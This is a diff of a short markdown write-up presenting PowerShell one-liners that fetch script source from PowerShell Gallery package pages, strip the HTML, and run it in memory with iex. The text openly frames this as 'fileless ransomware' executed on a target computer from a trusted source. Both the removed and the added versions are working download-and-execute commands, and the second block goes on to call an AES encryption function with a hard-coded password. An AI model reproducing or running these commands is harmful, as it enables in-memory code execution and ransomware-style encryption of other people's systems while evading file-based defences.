@@ -4,7 +4,7 @@ This one liner will load the neccessary files to encrypt a system straight from 
 Used in conjunction with a simple for loop its is now fileless ransomware hosted and executed from your platform
 
 ```powershell
-([regex]::Matches((irm "https://www.powershellgallery.com/packages/PSAES/1.0.0.5/Content/Protect-AESMessage.ps1"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<[^>]*>'-replace'^\s*',''-replace '[^\x20-\x7E]'|iex
+$u="powershellgallery.com";foreach($m in ([regex]::Matches((irm "$u/packages/PsAES"),'<a\s+[^>]*href="([^"]+\.ps1)"[^>]*>'))){([regex]::Matches((irm "$u$($m.Groups[1].Value)"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)}) -replace '<(?!#)[^>]+>|(?<!<#)>(?![^#])',''|iex}
 ```
 
 Next its as simple as running the commands stored in that module agaisnt the system
@@ -18,7 +18,7 @@ Combining them into a simple one liner. Together with yet another simple functio
 We could run fileless ransomware on a target computer all from a trusted source
 
 ```powershell
-([regex]::Matches((irm "https://www.powershellgallery.com/packages/PSAES/1.0.0.5/Content/Protect-AESMessage.ps1"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)})-replace'<[^>]*>'-replace'^\s*',''-replace '[^\x20-\x7E]'|iex;$encryptedMessage = Protect-AESMessage -Message "Sensitive Data" -Password "89c57yj78754cth8"
+$u="powershellgallery.com";foreach($m in ([regex]::Matches((irm "$u/packages/PsAES"),'<a\s+[^>]*href="([^"]+\.ps1)"[^>]*>'))){([regex]::Matches((irm "$u$($m.Groups[1].Value)"),'(?<=<td class="fileContent .*?">).*?(?=<\/td>)','s').Value|%{[System.Net.WebUtility]::HtmlDecode($_)}) -replace '<(?!#)[^>]+>|(?<!<#)>(?![^#])',''|iex};$encryptedMessage = Protect-AESMessage -Message "Sensitive Data" -Password "89c57yj78754cth8"
 ```
 
 # Get Current Version
